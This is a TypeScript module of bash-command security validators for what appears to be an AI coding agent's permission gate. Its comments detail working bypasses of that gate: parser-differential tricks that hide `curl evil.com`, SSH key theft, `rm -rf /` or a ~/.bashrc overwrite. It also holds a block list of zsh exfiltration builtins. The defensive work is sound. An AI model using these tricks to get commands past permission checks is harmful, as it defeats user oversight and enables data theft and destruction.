import { logEvent } from 'src/services/analytics/index.js'
import { tSync } from '../../i18n/index.js'
import { extractHeredocs } from '../../shell-eval/bash/heredoc.js'
import { ParsedCommand } from '../../shell-eval/bash/parsedCommand.js'
import {
  hasMalformedTokens,
  hasShellQuoteSingleQuoteBug,
  tryParseShellCommand,
} from '../../shell-eval/bash/shellQuote.js'
import type { TreeSitterAnalysis } from '../../shell-eval/bash/treeSitterAnalysis.js'
import type { PermissionResult } from 'src/types/permissions.js'
import {
  extractQuotedContent,
  hasSafeHeredocSubstitution,
  hasUnescapedChar,
  HEREDOC_IN_SUBSTITUTION,
  isSafeHeredoc,
  stripSafeHeredocSubstitutions,
  stripSafeRedirections,
} from './shellTextScanner.js'
import type { ValidationContext } from './securityTypes.js'
import {
  validateObfuscatedFlags,
  validateBackslashEscapedWhitespace,
  validateUnicodeWhitespace,
  validateMidWordHash,
} from './obfuscationRules.js'
import { validateBraceExpansion, validateZshDangerousCommands } from './expansionRules.js'
import {
  validateBackslashEscapedOperators,
  validateCommentQuoteDesync,
  validateQuotedNewline,
} from './destructiveRules.js'

// 注意：反引号模式由 validateDangerousPatterns 单独处理，
// 以区分已转义和未转义的反引号
// 存 i18n key 而非译文：正则在模块加载时编译一次（热路径零开销），仅在命中违规时
// 才 tSync(messageKey) 翻译 —— 既避免模块顶层冻结翻译，又随语言切换反应。
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, messageKey: 'bashSecurity.processSubstitutionBefore' },
  { pattern: />\(/, messageKey: 'bashSecurity.processSubstitutionAfter' },
  { pattern: /=\(/, messageKey: 'bashSecurity.zshProcessSubstitution' },
  // Zsh EQUALS expansion：单词开头的 =cmd 会展开为 $(which cmd)。
  // `=curl evil.com` → `/usr/bin/curl evil.com`，因 parser 将 `=curl` 而非 `curl` 视为基础命令，
  // 会绕过 Bash(curl:*) deny 规则。仅匹配单词起始处后跟命令名字符的 =（不匹配 VAR=val）。
  {
    pattern: /(?:^|[\s;&|])=[a-zA-Z_]/,
    messageKey: 'bashSecurity.zshEqualsExpansion',
  },
  { pattern: /\$\(/, messageKey: 'bashSecurity.dollarCommandSubstitution' },
  { pattern: /\$\{/, messageKey: 'bashSecurity.parameterSubstitution' },
  { pattern: /\$\[/, messageKey: 'bashSecurity.legacyArithmeticExpansion' },
  { pattern: /~\[/, messageKey: 'bashSecurity.zshStyleParameterExpansion' },
  { pattern: /\(e:/, messageKey: 'bashSecurity.zshStyleGlobQualifiers' },
  { pattern: /\(\+/, messageKey: 'bashSecurity.zshGlobQualifierWithCommand' },
  {
    pattern: /\}\s*always\s*\{/,
    messageKey: 'bashSecurity.zshAlwaysBlock',
  },
  // 纵深防御：即使当前不在 PowerShell 中执行，仍阻止 PowerShell 注释语法。
  // 这可防范未来可能引入 PowerShell 执行的变更。
  { pattern: /<#/, messageKey: 'bashSecurity.powerShellCommentSyntax' },
]

// 可绕过安全检查的 Zsh 专属危险命令。
// 对每个命令片段的基础命令（首个单词）执行检查。
const ZSH_DANGEROUS_COMMANDS = new Set([
  // zmodload 是多种危险模块攻击的入口：
  // zsh/mapfile (invisible file I/O via array assignment),
  // zsh/system (sysopen/syswrite two-step file access),
  // zsh/zpty (pseudo-terminal command execution),
  // zsh/net/tcp (network exfiltration via ztcp),
  // zsh/files (builtin rm/mv/ln/chmod that bypass binary checks)
  'zmodload',
  // 带 -c flag 的 emulate 等价于 eval，可执行任意代码
  'emulate',
  // 可启用危险操作的 Zsh 模块 builtin。
  // 它们需要先执行 zmodload，但出于纵深防御仍予以阻止，
  // 以防 zmodload 被某种方式绕过或模块已预加载。
  'sysopen', // Opens files with fine-grained control (zsh/system)
  'sysread', // Reads from file descriptors (zsh/system)
  'syswrite', // Writes to file descriptors (zsh/system)
  'sysseek', // Seeks on file descriptors (zsh/system)
  'zpty', // Executes commands on pseudo-terminals (zsh/zpty)
  'ztcp', // Creates TCP connections for exfiltration (zsh/net/tcp)
  'zsocket', // Creates Unix/TCP sockets (zsh/net/socket)
  'mapfile', // Not actually a command, but the associative array is set via zmodload
  'zf_rm', // Builtin rm from zsh/files
  'zf_mv', // Builtin mv from zsh/files
  'zf_ln', // Builtin ln from zsh/files
  'zf_chmod', // Builtin chmod from zsh/files
  'zf_chown', // Builtin chown from zsh/files
  'zf_mkdir', // Builtin mkdir from zsh/files
  'zf_rmdir', // Builtin rmdir from zsh/files
  'zf_chgrp', // Builtin chgrp from zsh/files
])

// bash 安全检查的数字标识符（避免记录字符串）
const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,
  JQ_SYSTEM_FUNCTION: 2,
  JQ_FILE_ARGUMENTS: 3,
  OBFUSCATED_FLAGS: 4,
  SHELL_METACHARACTERS: 5,
  DANGEROUS_VARIABLES: 6,
  NEWLINES: 7,
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,
  IFS_INJECTION: 11,
  GIT_COMMIT_SUBSTITUTION: 12,
  PROC_ENVIRON_ACCESS: 13,
  MALFORMED_TOKEN_INJECTION: 14,
  BACKSLASH_ESCAPED_WHITESPACE: 15,
  BRACE_EXPANSION: 16,
  CONTROL_CHARACTERS: 17,
  UNICODE_WHITESPACE: 18,
  MID_WORD_HASH: 19,
  ZSH_DANGEROUS_COMMANDS: 20,
  BACKSLASH_ESCAPED_OPERATORS: 21,
  COMMENT_QUOTE_DESYNC: 22,
  QUOTED_NEWLINE: 23,
} as const

function validateObfuscatedFlagsWithIds(context: ValidationContext): PermissionResult {
  return validateObfuscatedFlags(context, BASH_SECURITY_CHECK_IDS)
}

function validateBackslashEscapedWhitespaceWithIds(context: ValidationContext): PermissionResult {
  return validateBackslashEscapedWhitespace(context, BASH_SECURITY_CHECK_IDS)
}

function validateBackslashEscapedOperatorsWithIds(context: ValidationContext): PermissionResult {
  return validateBackslashEscapedOperators(context, BASH_SECURITY_CHECK_IDS)
}

function validateBraceExpansionWithIds(context: ValidationContext): PermissionResult {
  return validateBraceExpansion(context, BASH_SECURITY_CHECK_IDS)
}

function validateUnicodeWhitespaceWithIds(context: ValidationContext): PermissionResult {
  return validateUnicodeWhitespace(context, BASH_SECURITY_CHECK_IDS)
}

function validateMidWordHashWithIds(context: ValidationContext): PermissionResult {
  return validateMidWordHash(context, BASH_SECURITY_CHECK_IDS)
}

function validateCommentQuoteDesyncWithIds(context: ValidationContext): PermissionResult {
  return validateCommentQuoteDesync(context, BASH_SECURITY_CHECK_IDS)
}

function validateQuotedNewlineWithIds(context: ValidationContext): PermissionResult {
  return validateQuotedNewline(context, BASH_SECURITY_CHECK_IDS)
}

function validateZshDangerousCommandsWithIds(context: ValidationContext): PermissionResult {
  return validateZshDangerousCommands(context, BASH_SECURITY_CHECK_IDS)
}

function validateEmpty(context: ValidationContext): PermissionResult {
  if (!context.originalCommand.trim()) {
    return {
      behavior: 'allow',
      updatedInput: { command: context.originalCommand },
      decisionReason: { type: 'other', reason: 'Empty command is safe' },
    }
  }
  return { behavior: 'passthrough', message: tSync('bashSecurity.empty') }
}

function validateIncompleteCommands(context: ValidationContext): PermissionResult {
  const { originalCommand } = context
  const trimmed = originalCommand.trim()

  if (/^\s*\t/.test(originalCommand)) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.INCOMPLETE_COMMANDS,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.incompleteTab'),
    }
  }

  if (trimmed.startsWith('-')) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.INCOMPLETE_COMMANDS,
      subId: 2,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.incompleteFlags'),
    }
  }

  if (/^\s*(&&|\|\||;|>>?|<)/.test(originalCommand)) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.INCOMPLETE_COMMANDS,
      subId: 3,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.incompleteOperator'),
    }
  }

  return { behavior: 'passthrough', message: tSync('bashSecurity.complete') }
}

function validateSafeCommandSubstitution(context: ValidationContext): PermissionResult {
  const { originalCommand } = context

  if (!HEREDOC_IN_SUBSTITUTION.test(originalCommand)) {
    return { behavior: 'passthrough', message: tSync('bashSecurity.noHeredocInSubstitution') }
  }

  if (
    isSafeHeredoc(
      originalCommand,
      (remaining) => bashCommandIsSafe_DEPRECATED(remaining).behavior === 'passthrough',
    )
  ) {
    return {
      behavior: 'allow',
      updatedInput: { command: originalCommand },
      decisionReason: {
        type: 'other',
        reason: 'Safe command substitution: cat with quoted/escaped heredoc delimiter',
      },
    }
  }

  return {
    behavior: 'passthrough',
    message: tSync('bashSecurity.commandSubstitutionNeedsValidation'),
  }
}

function validateGitCommit(context: ValidationContext): PermissionResult {
  const { originalCommand, baseCommand } = context

  if (baseCommand !== 'git' || !/^git\s+commit\s+/.test(originalCommand)) {
    return { behavior: 'passthrough', message: tSync('bashSecurity.notGitCommit') }
  }

  // 安全：反斜杠可能导致 regex 误判引号边界
  //（如 `git commit -m "test\"msg" && evil`）。合法 commit 消息几乎不包含反斜杠，
  // 因此此时退回完整 validator 链。
  if (originalCommand.includes('\\')) {
    return {
      behavior: 'passthrough',
      message: tSync('bashSecurity.gitBackslash'),
    }
  }

  // 安全：`-m` 前的 `.*?` 不得匹配 shell operator。之前 `.*?` 会匹配除 `\n` 外的任何内容，
  // 包括 `;`、`&`、`|`、`` ` ``、`$(`。
  // For `git commit ; curl evil.com -m 'x'`, `.*?` swallowed `; curl evil.com `
  // 留下 remainder=``（falsy → 跳过 remainder 检查），从而对复合命令返回 `allow`。
  // 提前 allow 会跳过所有主 validator（约第 1908 行），使 validateQuotedNewline、
  // validateBackslashEscapedOperators 等全部失效。splitCommand 当前虽可在下游捕获，
  // 但提前 allow 是对整条命令安全性的肯定断言，而该命令并不安全。
  //
  // 另外：`git` 与 `commit` 之间的 `\s+` 不得匹配 `\n`/`\r`（bash 命令分隔符）。
  // 使用 `[ \t]+` 仅匹配水平空白。
  //
  // `[^;&|`$<>()\n\r]*?` 字符类排除 shell 元字符。此处也排除 `<` 和 `>`（重定向）；
  // 它们可出现在 `--author="Name <email>"` 的 remainder 中，但不得出现在 `-m` 之前。
  const messageMatch = originalCommand.match(
    /^git[ \t]+commit[ \t]+[^;&|`$<>()\n\r]*?-m[ \t]+(["'])([\s\S]*?)\1(.*)$/,
  )

  if (messageMatch) {
    const [, quote, messageContent, remainder] = messageMatch

    if (quote === '"' && messageContent && /\$\(|`|\$\{/.test(messageContent)) {
      logEvent('zy_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.GIT_COMMIT_SUBSTITUTION,
        subId: 1,
      })
      return {
        behavior: 'ask',
        message: tSync('bashSecurity.gitCommitSubstitution'),
      }
    }

    // 安全：检查 remainder 中可串联命令或重定向输出的 shell operator。
    // regex 中 `-m` 前的 `.*` 可吞掉 `--amend` 等 flag，在 remainder 中留下 `&& evil` 或 `> ~/.bashrc`。
    // 之前此处仅检查 $() / `` / ${}，遗漏了 ; | & && || < > 等 operator。
    //
    // `<` 和 `>` 可合法出现在 `--author="Name <email>"` 这类 --author 值的引号内。
    // 未引用的 `>` 则是 shell 重定向 operator。validateGitCommit 是早期 validator，
    // 在此返回 `allow` 会短路 bashCommandIsSafe 并跳过 validateRedirections。
    // 因此遇到未引用的 `<>` 时必须退回 passthrough，交由主 validator 处理。
    //
    // Attack: `git commit --allow-empty -m 'payload' > ~/.bashrc`
    //   validateGitCommit returns allow → bashCommandIsSafe short-circuits →
    //   validateRedirections NEVER runs → ~/.bashrc overwritten with git
    //   stdout containing `payload` → RCE on next shell login.
    if (remainder && /[;|&()`]|\$\(|\$\{/.test(remainder)) {
      return {
        behavior: 'passthrough',
        message: tSync('bashSecurity.gitRemainderMetacharacters'),
      }
    }
    if (remainder) {
      // 移除引号内容后检查 `<` 或 `>`。已引用的 `<>`（--author 中的 email 括号）是安全的；
      // 未引用的 `<>` 是 shell 重定向。
      // NOTE: This simple quote tracker has NO backslash handling. `\'`/`\"`
      // outside quotes would desync it (bash: \' = literal ', tracker: toggles
      // SQ). BUT line 584 already bailed on ANY backslash in originalCommand,
      // so we never reach here with backslashes. For backslash-free input,
      // simple quote toggling is correct (no way to escape quotes without \\).
      let unquoted = ''
      let inSQ = false
      let inDQ = false
      for (let i = 0; i < remainder.length; i++) {
        const c = remainder[i]
        if (c === "'" && !inDQ) {
          inSQ = !inSQ
          continue
        }
        if (c === '"' && !inSQ) {
          inDQ = !inDQ
          continue
        }
        if (!inSQ && !inDQ) {
          unquoted += c
        }
      }
      if (/[<>]/.test(unquoted)) {
        return {
          behavior: 'passthrough',
          message: tSync('bashSecurity.gitRemainderRedirect'),
        }
      }
    }

    // 安全加固：阻止以短横线开头的消息。
    // 用于捕获 git commit -m "---" 这类潜在混淆模式。
    if (messageContent?.startsWith('-')) {
      logEvent('zy_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
        subId: 5,
      })
      return {
        behavior: 'ask',
        message: tSync('bashSecurity.quotedInFlag'),
      }
    }

    return {
      behavior: 'allow',
      updatedInput: { command: originalCommand },
      decisionReason: {
        type: 'other',
        reason: 'Git commit with simple quoted message is allowed',
      },
    }
  }

  return { behavior: 'passthrough', message: tSync('bashSecurity.gitCommitNeedsValidation') }
}

function validateJqCommand(context: ValidationContext): PermissionResult {
  const { originalCommand, baseCommand } = context

  if (baseCommand !== 'jq') {
    return { behavior: 'passthrough', message: tSync('bashSecurity.notJq') }
  }

  if (/\bsystem\s*\(/.test(originalCommand)) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.JQ_SYSTEM_FUNCTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.jqSystemFunction'),
    }
  }

  // 现在允许文件参数，它们会由 readOnlyValidation.ts 的路径校验处理。
  // 仅阻止可将文件读入 jq 变量的危险 flag。
  const afterJq = originalCommand.substring(3).trim()
  if (/(?:^|\s)(?:-f\b|--from-file|--rawfile|--slurpfile|-L\b|--library-path)/.test(afterJq)) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.JQ_FILE_ARGUMENTS,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.jqDangerousFlags'),
    }
  }

  return { behavior: 'passthrough', message: tSync('bashSecurity.jqSafe') }
}

function validateShellMetacharacters(context: ValidationContext): PermissionResult {
  const { unquotedContent } = context
  const message = tSync('bashSecurity.shellMetacharacters')

  if (/(?:^|\s)["'][^"']*[;&][^"']*["'](?:\s|$)/.test(unquotedContent)) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
      subId: 1,
    })
    return { behavior: 'ask', message }
  }

  const globPatterns = [
    /-name\s+["'][^"']*[;|&][^"']*["']/,
    /-path\s+["'][^"']*[;|&][^"']*["']/,
    /-iname\s+["'][^"']*[;|&][^"']*["']/,
  ]

  if (globPatterns.some((p) => p.test(unquotedContent))) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
      subId: 2,
    })
    return { behavior: 'ask', message }
  }

  if (/-regex\s+["'][^"']*[;&][^"']*["']/.test(unquotedContent)) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
      subId: 3,
    })
    return { behavior: 'ask', message }
  }

  return { behavior: 'passthrough', message: tSync('bashSecurity.noMetacharacters') }
}

function validateDangerousVariables(context: ValidationContext): PermissionResult {
  const { fullyUnquotedContent } = context

  if (
    /[<>|]\s*\$[A-Za-z_]/.test(fullyUnquotedContent) ||
    /\$[A-Za-z_][A-Za-z0-9_]*\s*[|<>]/.test(fullyUnquotedContent)
  ) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_VARIABLES,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.dangerousVariables'),
    }
  }

  return { behavior: 'passthrough', message: tSync('bashSecurity.noDangerousVariables') }
}

function validateDangerousPatterns(context: ValidationContext): PermissionResult {
  const { unquotedContent } = context

  // 特殊处理反引号：仅检查未转义的反引号。
  // 已转义反引号（如 \`）是安全的，且常用于 SQL 命令。
  if (hasUnescapedChar(unquotedContent, '`')) {
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.backticks'),
    }
  }

  // 其他命令替换检查（包含双引号内容）
  for (const { pattern, messageKey } of COMMAND_SUBSTITUTION_PATTERNS) {
    if (pattern.test(unquotedContent)) {
      logEvent('zy_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION,
        subId: 1,
      })
      return {
        behavior: 'ask',
        message: tSync('bashSecurity.commandSubstitution', { pattern: tSync(messageKey) }),
      }
    }
  }

  return { behavior: 'passthrough', message: tSync('bashSecurity.noDangerousPatterns') }
}

function validateRedirections(context: ValidationContext): PermissionResult {
  const { fullyUnquotedContent } = context

  if (/</.test(fullyUnquotedContent)) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_PATTERNS_INPUT_REDIRECTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.inputRedirection'),
    }
  }

  if (/>/.test(fullyUnquotedContent)) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_PATTERNS_OUTPUT_REDIRECTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.outputRedirection'),
    }
  }

  return { behavior: 'passthrough', message: tSync('bashSecurity.noRedirections') }
}

function validateNewlines(context: ValidationContext): PermissionResult {
  // 使用 stripSafeRedirections 之前的 fullyUnquotedPreStrip，
  // 防止移除 `>/dev/null` 后产生幽灵式反斜杠换行续写而绕过。
  // E.g., `cmd \>/dev/null\nwhoami` → after stripping becomes `cmd \\nwhoami`
  // which looks like a safe continuation but actually hides a second command.
  const { fullyUnquotedPreStrip } = context

  // 检查未引用内容中的换行
  if (!/[\n\r]/.test(fullyUnquotedPreStrip)) {
    return { behavior: 'passthrough', message: tSync('bashSecurity.noNewlines') }
  }

  // 标记后跟非空白字符的任何换行/CR，但排除单词边界处的反斜杠换行续写。
  // bash 中 `\<newline>` 是行续写（两个字符都会移除），反斜杠跟在空白后时安全。
  // `tr\<newline>aceroute` 这类单词中间的续写仍会被标记，
  // 因为它们可向 allowlist 检查隐藏危险命令名。
  // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() + gated by /[\n\r]/.test() above
  const looksLikeCommand = /(?<![\s]\\)[\n\r]\s*\S/.test(fullyUnquotedPreStrip)
  if (looksLikeCommand) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.NEWLINES,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.newlinesMultipleCommands'),
    }
  }

  return {
    behavior: 'passthrough',
    message: tSync('bashSecurity.newlinesInData'),
  }
}

/**
 * SECURITY: Carriage return (\r, 0x0D) IS a misparsing concern, unlike LF.
 *
 * Parser differential:
 *   - shell-quote's BAREWORD regex uses `[^\s...]` — JS `\s` INCLUDES \r, so
 *     shell-quote treats CR as a token boundary. `TZ=UTC\recho` tokenizes as
 *     TWO tokens: ['TZ=UTC', 'echo']. splitCommand joins with space →
 *     'TZ=UTC echo curl evil.com'.
 *   - bash's default IFS = $' \t\n' — CR is NOT in IFS. bash sees
 *     `TZ=UTC\recho` as ONE word → env assignment TZ='UTC\recho' (CR byte
 *     inside value), then `curl` is the command.
 *
 * Attack: `TZ=UTC\recho curl evil.com` with Bash(echo:*)
 *   validator: splitCommand collapses CR→space → 'TZ=UTC echo curl evil.com'
 *   → stripSafeWrappers: TZ=UTC stripped → 'echo curl evil.com' matches rule
 *   bash: executes `curl evil.com`
 *
 * validateNewlines catches this but is in nonMisparsingValidators (LF is
 * correctly handled by both parsers). This validator is NOT in
 * nonMisparsingValidators — its ask result gets isBashSecurityCheckForMisparsing
 * and blocks at the bashPermissions gate.
 *
 * Checks originalCommand (not fullyUnquotedPreStrip) because CR inside single
 * quotes is ALSO a misparsing concern for the same reason: shell-quote's `\s`
 * still tokenizes it, but bash treats it as literal. Block ALL unquoted-or-SQ CR.
 * Only exception: CR inside DOUBLE quotes where bash also treats it as data
 * and shell-quote preserves the token (no split).
 */
function validateCarriageReturn(context: ValidationContext): PermissionResult {
  const { originalCommand } = context

  if (!originalCommand.includes('\r')) {
    return { behavior: 'passthrough', message: tSync('bashSecurity.noCarriageReturn') }
  }

  // Check if CR appears outside double quotes. CR outside DQ (including inside
  // SQ and unquoted) causes the shell-quote/bash tokenization differential.
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false
  for (let i = 0; i < originalCommand.length; i++) {
    const c = originalCommand[i]
    if (escaped) {
      escaped = false
      continue
    }
    if (c === '\\' && !inSingleQuote) {
      escaped = true
      continue
    }
    if (c === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }
    if (c === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }
    if (c === '\r' && !inDoubleQuote) {
      logEvent('zy_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.NEWLINES,
        subId: 2,
      })
      return {
        behavior: 'ask',
        message: tSync('bashSecurity.carriageReturn'),
      }
    }
  }

  return { behavior: 'passthrough', message: tSync('bashSecurity.crOnlyInsideDoubleQuotes') }
}

function validateIFSInjection(context: ValidationContext): PermissionResult {
  const { originalCommand } = context

  // 检测任何可能用于绕过 regex 校验的 IFS 变量用法。
  // 检查 $IFS 和 ${...IFS...} 模式，包括 ${IFS:0:1}、${#IFS} 等参数展开。
  // 使用 ${[^}]*IFS 捕获所有包含 IFS 的参数展开变体。
  if (/\$IFS|\$\{[^}]*IFS/.test(originalCommand)) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.IFS_INJECTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.ifsVariable'),
    }
  }

  return { behavior: 'passthrough', message: tSync('bashSecurity.noIfsInjection') }
}

// 防止通过 /proc 文件系统读取环境变量的额外加固。
// 路径校验通常会阻止 /proc 访问，此处再提供一层纵深防御。
// /proc 中的环境文件可能暴露 API key 和 secret 等敏感数据。
function validateProcEnvironAccess(context: ValidationContext): PermissionResult {
  const { originalCommand } = context

  // 检查可能暴露环境变量的 /proc 路径，捕获如下模式：
  // - /proc/self/environ
  // - /proc/1/environ
  // - /proc/*/environ (with any PID)
  if (/\/proc\/.*\/environ/.test(originalCommand)) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.PROC_ENVIRON_ACCESS,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.procEnviron'),
    }
  }

  return {
    behavior: 'passthrough',
    message: tSync('bashSecurity.noProcEnviron'),
  }
}

/**
 * 检测同时包含异常 token（定界符不平衡）和命令分隔符的命令。
 * 用于捕获可能利用模糊 shell 语法的注入模式。
 *
 * 安全：该检查用于捕获 HackerOne review 中发现的 eval 绕过。
 * shell-quote 解析 `echo {"hi":"hi;evil"}` 这类模糊模式时，可能产生不平衡 token（如 `{hi:"hi`）。
 * 它与命令分隔符结合时，可能因 eval 重新解析而执行意外命令。
 *
 * 对这些模式强制要求用户批准，可确保用户在批准前准确看到将执行的内容。
 */
function validateMalformedTokenInjection(context: ValidationContext): PermissionResult {
  const { originalCommand } = context

  const parseResult = tryParseShellCommand(originalCommand)
  if (!parseResult.success) {
    // 解析失败，由其他流程处理（bashToolHasPermission 会检查）
    return {
      behavior: 'passthrough',
      message: tSync('bashSecurity.parseFailed'),
    }
  }

  const parsed = parseResult.tokens

  // 检查命令分隔符（;、&&、||）
  const hasCommandSeparator = parsed.some(
    (entry) =>
      typeof entry === 'object' &&
      entry !== null &&
      'op' in entry &&
      (entry.op === ';' || entry.op === '&&' || entry.op === '||'),
  )

  if (!hasCommandSeparator) {
    return { behavior: 'passthrough', message: tSync('bashSecurity.noCommandSeparators') }
  }

  // 检查异常 token（定界符不平衡）
  if (hasMalformedTokens(originalCommand, parsed)) {
    logEvent('zy_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.MALFORMED_TOKEN_INJECTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: tSync('bashSecurity.ambiguousSeparators'),
    }
  }

  return {
    behavior: 'passthrough',
    message: tSync('bashSecurity.noMalformedToken'),
  }
}

/**
 * Detects a backslash immediately preceding a shell operator outside of quotes.
 *
 * SECURITY: splitCommand normalizes `\;` to a bare `;` in its output string.
 * When downstream code (checkReadOnlyConstraints, checkPathConstraints, etc.)
 * re-parses that normalized string, the bare `;` is seen as an operator and
 * causes a false split. This enables arbitrary file read bypassing path checks:
 *
 *   cat safe.txt \; echo ~/.ssh/id_rsa
 *
 * In bash: ONE cat command reading safe.txt, ;, echo, ~/.ssh/id_rsa as files.
 * After splitCommand normalizes: "cat safe.txt ; echo ~/.ssh/id_rsa"
 * Nested re-parse: ["cat safe.txt", "echo ~/.ssh/id_rsa"] — both segments
 * pass isCommandReadOnly, sensitive path hidden in echo segment is never
 * validated by path constraints. Auto-allowed. Private key leaked.
 *
 * This check flags any \<operator> regardless of backslash parity. Even counts
 * (\\;) are dangerous in bash (\\ → \, ; separates). Odd counts (\;) are safe
 * in bash but trigger the double-parse bug above. Both must be flagged.
 *
 * Known false positive: `find . -exec cmd {} \;` — users will be prompted once.
 *
 * Note: `(` and `)` are NOT in this set — splitCommand preserves `\(` and `\)`
 * in its output (round-trip safe), so they don't trigger the double-parse bug.
 * This allows `find . \( -name x -o -name y \)` to pass without false positives.
 */
/**
 * Detects when a `#` comment contains quote characters that would desync
 * downstream quote trackers (like extractQuotedContent).
 *
 * In bash, everything after an unquoted `#` on a line is a comment — quote
 * characters inside the comment are literal text, not quote toggles. But our
 * quote-tracking functions don't handle comments, so a `'` or `"` after `#`
 * toggles their quote state. Attackers can craft `# ' "` sequences that
 * precisely desync the tracker, causing subsequent content (on following
 * lines) to appear "inside quotes" when it's actually unquoted in bash.
 *
 * Example attack:
 *   echo "it's" # ' " <<'MARKER'\n
 *   rm -rf /\n
 *   MARKER
 * In bash: `#` starts a comment, `rm -rf /` executes on line 2.
 * In extractQuotedContent: the `'` at position 14 (after #) opens a single
 * quote, and the `'` before MARKER closes it. But the `'` after MARKER opens
 * ANOTHER single quote, swallowing the newline and `rm -rf /`, so
 * validateNewlines sees no unquoted newlines.
 *
 * Defense: If we see an unquoted `#` followed by any quote character on the
 * same line, treat it as a misparsing concern. Legitimate commands rarely
 * have quote characters in their comments (and if they do, the user can
 * approve manually).
 */
/**
 * Detects a newline inside a quoted string where the NEXT line would be
 * stripped by stripCommentLines (trimmed line starts with `#`).
 *
 * In bash, `\n` inside quotes is a literal character and part of the argument.
 * But stripCommentLines (called by stripSafeWrappers in bashPermissions before
 * path validation and rule matching) processes commands LINE-BY-LINE via
 * `command.split('\n')` without tracking quote state. A quoted newline lets an
 * attacker position the next line to start with `#` (after trim), causing
 * stripCommentLines to drop that line entirely — hiding sensitive paths or
 * arguments from path validation and permission rule matching.
 *
 * Example attack (auto-allowed in acceptEdits mode without any Bash rules):
 *   mv ./decoy '<\n>#' ~/.ssh/id_rsa ./exfil_dir
 * Bash: moves ./decoy AND ~/.ssh/id_rsa into ./exfil_dir/ (errors on `\n#`).
 * stripSafeWrappers: line 2 starts with `#` → stripped → "mv ./decoy '".
 * shell-quote: drops unbalanced trailing quote → ["mv", "./decoy"].
 * checkPathConstraints: only sees ./decoy (in cwd) → passthrough.
 * acceptEdits mode: mv with all-cwd paths → ALLOW. Zero clicks, no warning.
 *
 * Also works with cp (exfil), rm/rm -rf (delete arbitrary files/dirs).
 *
 * Defense: block ONLY the specific stripCommentLines trigger — a newline inside
 * quotes where the next line starts with `#` after trim. This is the minimal
 * check that catches the parser differential while preserving legitimate
 * multi-line quoted arguments (echo 'line1\nline2', grep patterns, etc.).
 * Safe heredocs ($(cat <<'EOF'...)) and git commit -m "..." are handled by
 * early validators and never reach this check.
 *
 * This validator is NOT in nonMisparsingValidators — its ask result gets
 * isBashSecurityCheckForMisparsing: true, causing an early block in the
 * permission flow at bashPermissions.ts before any line-based processing runs.
 */
/**
 * 校验命令未使用可绕过安全检查的 Zsh 专属危险命令。
 * 这些命令提供加载 kernel 模块、原始文件 IO、网络访问和伪终端执行等能力，
 * 可规避常规 permission 检查。
 *
 * 同时捕获可对命令历史执行任意 editor 的 `fc -e`，
 * 以及带 `-c` 时等价于 eval 的 `emulate`。
 */
// 匹配 shell 命令中无合法用途的不可打印控制字符：
// 0x00-0x08、0x0B-0x0C、0x0E-0x1F、0x7F。排除由其他 validator 处理的 tab (0x09)、
// newline (0x0A) 和 carriage return (0x0D)。Bash 会静默丢弃 null 字节并忽略大多数控制字符，
// 攻击者因此可用它们令元字符滑过检查，而 bash 仍会执行。
// eslint-disable-next-line no-control-regex
const CONTROL_CHAR_RE = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/

/**
 * @deprecated Legacy regex/shell-quote path. Only used when tree-sitter is
 * unavailable. The primary gate is parseForSecurity (ast.ts).
 */
